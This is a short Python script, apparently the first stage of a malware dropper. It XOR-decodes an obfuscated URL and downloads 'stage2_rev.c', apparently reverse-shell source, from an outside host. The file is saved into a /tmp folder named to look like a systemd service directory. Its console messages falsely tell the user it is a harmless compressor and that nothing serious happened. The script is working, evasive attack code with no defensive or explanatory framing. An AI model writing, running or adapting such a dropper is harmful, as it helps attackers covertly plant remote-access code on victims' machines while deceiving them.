import requests
import base64
from pathlib import Path

TMP_DIR = "/tmp/systemd-pr1vate-6e9393d58a-enit.service.compressor-SEFC/"

def _deo(encoded: str, key: int) -> str:
    decoded = base64.b64decode(encoded)
    return ''.join(chr(b ^ key) for b in decoded)

# Encrypted URL for stage2_rev.c
_ENC_STAGE2_C = "c3twbHN0emxze3psc3B7eHd3d3dtMTYjJSdwHTAnNGwh"  # Your provided encrypted string
URL_STAGE2_C = f"http://{_deo(_ENC_STAGE2_C, 0x42)}"

def download_file(url, dest_path):
    r = requests.get(url, timeout=5)
    if r.status_code == 200:
        with open(dest_path, "wb") as f:
            f.write(r.content)
        print(f"[+] Just a simple OIIAIOIIIIAI compressor")
    else:
        print(f"[!] Nothing serious don't worry :D yayy")

def main():
    Path(TMP_DIR).mkdir(parents=True, exist_ok=True)
    download_file(URL_STAGE2_C, f"{TMP_DIR}stage2_rev.c")

if __name__ == "__main__":
    main()


